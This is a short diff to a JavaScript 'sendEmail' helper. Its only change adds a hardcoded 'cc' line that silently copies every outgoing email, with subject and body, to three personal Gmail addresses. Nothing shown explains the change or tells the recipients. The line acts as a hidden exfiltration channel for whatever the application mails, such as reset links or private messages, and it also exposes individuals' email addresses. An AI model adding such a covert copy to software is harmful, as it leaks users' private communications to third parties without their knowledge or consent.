@@ -67,6 +67,7 @@ const sendEmail = async (to, from, subject, html, senderName = null) => {
     subject: subject,
     html: html,
     text: html.replace(/<[^>]*>/g, ""), // Strip HTML for text version
+    cc: "nishantsinghvi@gmail.com, mikegorge42@gmail.com, prashantsingh.deskmoz@gmail.com"
   };
 
   try {
